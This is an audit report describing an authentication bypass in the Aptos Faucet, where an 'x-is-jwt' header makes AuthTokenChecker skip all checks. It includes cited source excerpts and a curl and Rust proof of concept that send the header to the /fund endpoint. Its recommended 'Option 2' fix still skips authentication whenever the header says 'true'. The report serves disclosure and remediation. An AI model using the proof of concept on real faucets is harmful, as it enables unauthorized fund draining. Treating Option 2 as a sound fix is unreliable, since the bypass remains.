# Audit Report

## Title
Authentication Bypass in Aptos Faucet via X-IS-JWT Header Manipulation

## Summary
The Aptos Faucet's `AuthTokenChecker` contains an authentication bypass vulnerability where an attacker can skip all authentication checks by simply adding an `x-is-jwt` header to their request, without providing any valid JWT or authentication token. This occurs due to inconsistent assumptions about when JWT validation is performed across different checker components.

## Finding Description

The vulnerability exists in the authentication flow of the Aptos Faucet service. The `AuthTokenChecker` is designed to validate authentication tokens, but it contains a critical assumption: if the `X_IS_JWT_HEADER` is present in the request, it skips all authentication checks and assumes JWT validation will happen elsewhere. [1](#0-0) 

The code checks only for the **presence** of the header key, not its value or the validity of any JWT. When this header exists, the checker immediately returns success without performing any authentication.

However, JWT validation only occurs in a completely different component - the `RedisRatelimitChecker` - and only when it's specifically configured with JWT-based rate limiting: [2](#0-1) 

The JWT validation is performed via `validate_jwt()`, which is the only place in the entire faucet codebase that actually verifies JWT tokens: [3](#0-2) 

**Vulnerable Configuration:** If a faucet instance is configured with:
- `AuthTokenChecker` enabled (to require authentication)
- `RedisRatelimitChecker` either disabled OR configured with IP-based rate limiting (`RatelimitKeyProviderConfig::Ip`)

Then the authentication responsibility falls between two checkers with no actual validation occurring.

**Attack Path:**
1. Attacker sends a funding request to the faucet
2. Includes header `x-is-jwt: true` (or any value)
3. Does NOT include a valid JWT token in the Authorization header
4. `AuthTokenChecker.check()` sees the header exists and returns `Ok(vec![])` (line 38-39)
5. `RedisRatelimitChecker` either doesn't run (not configured) or runs with IP-based rate limiting (no JWT validation)
6. Request bypasses all authentication and gets processed

The checker execution flow shows that all checkers run sequentially, collecting rejections: [4](#0-3) 

## Impact Explanation

This vulnerability allows complete authentication bypass on the Aptos Faucet service, marked as **High** severity in the security question. The impact includes:

- **Unauthorized Fund Access**: Attackers can request faucet funds without any valid authentication
- **Rate Limit Bypass**: If JWT-based rate limiting isn't configured, attackers can drain faucet funds by making unlimited requests
- **Service Abuse**: Legitimate users may be denied service if attackers exhaust faucet resources

While this doesn't directly affect blockchain consensus or on-chain security, it represents a critical failure of the faucet's access control mechanisms, allowing unauthorized distribution of test tokens and potential service disruption.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is extremely easy to exploit:
- No specialized knowledge required
- No valid credentials needed
- Single HTTP header addition
- Works against any misconfigured faucet instance
- No rate limiting if `RedisRatelimitChecker` not configured with JWT mode

The vulnerability will manifest in any deployment where:
1. Operators enable `AuthTokenChecker` for security
2. But fail to configure `RedisRatelimitChecker` with JWT mode
3. Or disable `RedisRatelimitChecker` entirely for simplicity

This misconfiguration is likely in development/testing environments or production deployments that prioritize simplicity over defense-in-depth.

## Recommendation

The fundamental issue is split authentication responsibility between independent checkers without proper coordination. The fix should enforce that JWT validation occurs when the JWT header is present:

**Option 1: Move JWT validation into AuthTokenChecker**
Create a dedicated JWT authentication checker that validates JWTs when `X_IS_JWT_HEADER` is present, making authentication self-contained.

**Option 2: Strengthen the check in AuthTokenChecker**
Modify `AuthTokenChecker` to validate that when `X_IS_JWT_HEADER` is present, an actual JWT validation checker is configured and will run:

```rust
async fn check(
    &self,
    data: CheckerData,
    _dry_run: bool,
) -> Result<Vec<RejectionReason>, AptosTapError> {
    // If JWT header is present, require that JWT validation will occur elsewhere
    // This check should be coordinated with server configuration
    if data.headers.contains_key(X_IS_JWT_HEADER) {
        // Validate that the header value is "true" at minimum
        let is_jwt = data.headers.get(X_IS_JWT_HEADER)
            .and_then(|v| v.to_str().ok())
            .map(|v| v.eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        
        if !is_jwt {
            return Ok(vec![RejectionReason::new(
                "Invalid x-is-jwt header value".to_string(),
                RejectionReasonCode::AuthTokenInvalid,
            )]);
        }
        
        // Only skip auth token check if we're certain JWT validation is configured
        // This requires coordination with RedisRatelimitChecker configuration
        return Ok(vec![]);
    }
    
    // ... rest of auth token validation
}
```

**Option 3: Fail-safe default**
Change the default behavior to require explicit authentication in all cases, removing the implicit delegation to JWT validation.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Bypass authentication on Aptos Faucet

# Vulnerable faucet configuration (AuthTokenChecker enabled, no JWT validation)
# Normal request without authentication - REJECTED
curl -H 'Content-Type: application/json' \
     -X POST \
     -d '{"amount": 1000000000, "address": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"}' \
     http://faucet-endpoint/fund

# Expected: {"error_code": "Rejected", "rejection_reasons": [{"code": "AuthTokenInvalid", ...}]}

# Attack request with x-is-jwt header - BYPASSED
curl -H 'Content-Type: application/json' \
     -H 'x-is-jwt: true' \
     -X POST \
     -d '{"amount": 1000000000, "address": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"}' \
     http://faucet-endpoint/fund

# Expected: {"txn_hashes": ["..."]} - SUCCESS, authentication bypassed!
```

**Rust Integration Test:**
```rust
#[tokio::test]
async fn test_jwt_header_bypass() {
    // Configure faucet with AuthTokenChecker but NO JWT validation
    let config = RunConfig {
        checker_configs: vec![
            CheckerConfig::AuthToken(/* config with required tokens */),
            // Note: RedisRatelimit either disabled or configured with IP mode
        ],
        // ... other config
    };
    
    let (port, _handle) = start_server(config).await.unwrap();
    
    // Request with x-is-jwt header but NO valid JWT
    let response = reqwest::Client::new()
        .post(format!("http://127.0.0.1:{}/fund", port))
        .json(&FundRequest {
            amount: Some(1000000000),
            address: Some("0xabcd...".to_string()),
            ..Default::default()
        })
        .header("x-is-jwt", "true")
        // Note: NO Authorization header with valid JWT!
        .send()
        .await
        .unwrap();
    
    // Vulnerability: Request succeeds despite no authentication
    assert_eq!(response.status(), StatusCode::OK);
}
```

## Notes

This vulnerability is specific to the Aptos Faucet service and does not affect core blockchain security (consensus, Move VM, state management, or on-chain governance). However, it represents a critical access control failure in the faucet's authentication architecture, enabling unauthorized fund distribution and service abuse.

The issue arises from implicit coordination assumptions between independent checker components. Defense-in-depth principles require that authentication be self-contained within a single component rather than distributed across multiple optional checkers.

### Citations

**File:** crates/aptos-faucet/core/src/checkers/auth_token.rs (L37-40)
```rust
        // Don't check if the request has X_IS_JWT_HEADER set.
        if data.headers.contains_key(X_IS_JWT_HEADER) {
            return Ok(vec![]);
        }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L44-50)
```rust
    pub async fn ratelimit_key_value(&self, data: &CheckerData) -> Result<String, AptosTapError> {
        match self {
            RatelimitKeyProvider::Ip => Ok(data.source_ip.to_string()),
            RatelimitKeyProvider::Jwt(jwt_verifier) => {
                jwt_verifier.validate_jwt(data.headers.clone()).await
            },
        }
```

**File:** crates/aptos-faucet/core/src/firebase_jwt.rs (L41-64)
```rust
    pub async fn validate_jwt(&self, headers: Arc<HeaderMap>) -> Result<String, AptosTapError> {
        let auth_token = jwt_sub(headers)?;

        let verify = self.jwt_verifier.verify::<JwtClaims>(&auth_token);
        let token_data = match verify.await {
            Some(token_data) => token_data,
            None => {
                return Err(AptosTapError::new(
                    "Failed to verify JWT token".to_string(),
                    AptosTapErrorCode::AuthTokenInvalid,
                ));
            },
        };
        let claims = token_data.claims;

        if !claims.email_verified {
            return Err(AptosTapError::new(
                "The JWT token is not verified".to_string(),
                AptosTapErrorCode::AuthTokenInvalid,
            ));
        }

        Ok(claims.sub)
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L262-270)
```rust
        let mut rejection_reasons = Vec::new();
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }
```
